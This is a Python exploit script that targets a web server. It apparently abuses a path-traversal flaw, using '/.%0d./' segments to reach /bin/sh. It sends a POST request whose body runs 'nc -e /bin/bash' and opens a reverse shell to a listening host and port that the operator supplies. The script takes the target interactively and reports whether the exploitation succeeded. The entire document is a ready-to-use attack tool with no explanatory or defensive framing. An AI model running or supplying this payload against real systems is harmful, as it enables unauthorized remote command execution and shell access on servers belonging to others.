import socket

TARGET = input('Target: ')
PORT = 80

lhost = input('Listening host: ')
lport = input('Listening port: ')
command = f'nc -e /bin/bash {lhost} {lport} 2>&1'
url = '/.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n'

payload = url + 'Content-Length: 1\r\n\r\n' + 'echo\necho\n' + command


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))
s.send(bytes('POST ' + payload, 'utf-8'))
r = str(s.recv(4096)).replace('\\r\\n','\n').replace('\\n','\n').replace('b\'','\'').replace('\'','')
try:
    assert('200' in r)
    print('\nExploit completed successfully.')
except:
    print('\nThe exploitation attempt failed:\n')
    print(r)
s.close()